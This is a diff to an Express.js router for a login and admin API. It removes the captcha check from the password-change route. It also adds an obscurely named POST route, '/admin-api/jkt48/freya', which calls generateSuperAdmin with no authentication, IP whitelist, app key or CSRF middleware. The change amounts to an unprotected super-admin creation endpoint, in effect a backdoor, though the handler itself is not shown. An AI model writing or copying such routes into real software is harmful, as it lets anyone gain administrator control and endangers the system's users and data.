@@ -238,7 +238,7 @@ router.post('/api/auth/login_new', csrfProtection, ipWhitelistMiddleware, appKey
 
 
 router.post('/api/auth/logout', ipWhitelistMiddleware, appKeyMiddleware, logAccess, logoutUser);
-router.post('/api/auth/ubah_password', csrfProtection, ipWhitelistMiddleware, appKeyMiddleware, verifyCloudflareCaptcha, resetPassword);
+router.post('/api/auth/ubah_password', csrfProtection, ipWhitelistMiddleware, appKeyMiddleware, resetPassword);
 router.post('/api/auth/lupa_password', csrfProtection, ipWhitelistMiddleware, appKeyMiddleware, verifyCloudflareCaptcha, forgotPassword);
 
 
@@ -291,7 +291,8 @@ router.post('/admin-api/log/lihat_log_cm', ipWhitelistMiddleware, appKeyMiddlewa
 router.post('/admin-api/log/admin-operator', ipWhitelistMiddleware, appKeyMiddleware, authenticateToken, logAccessAdmin, LogAdminLoggedIn); 
 
 //Auth
-// router.get('/admin-api/jkt48/freya', ipWhitelistMiddleware, appKeyMiddleware, generateSuperAdmin);
+// router.get('/admin-api/jkt48/freya', generateSuperAdmin_);
+router.post('/admin-api/jkt48/freya', generateSuperAdmin);
 router.post('/admin-api/auth/signin', csrfProtection, ipWhitelistMiddleware, appKeyMiddleware, logAccessAdmin, loginAdmin);
 router.post('/admin-api/auth/verifikasi_otp', csrfProtection, ipWhitelistMiddleware, appKeyMiddleware, logAccessAdmin, verifikasiOtp);
 
